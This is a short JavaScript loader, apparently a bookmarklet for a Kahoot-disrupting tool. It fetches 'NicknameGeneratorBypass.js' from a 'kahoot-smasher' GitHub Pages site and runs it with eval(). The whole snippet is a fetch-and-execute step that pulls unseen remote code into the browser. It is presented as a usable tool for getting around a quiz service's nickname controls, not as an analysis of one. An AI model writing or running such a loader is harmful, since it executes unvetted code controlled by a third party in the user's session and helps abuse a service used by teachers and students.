(function () {
  fetch('https://thatfrueddued.github.io/kahoot-smasher/NicknameGeneratorBypass.js')
    .then(r => r.text())
    .then(code => eval(code));
})();
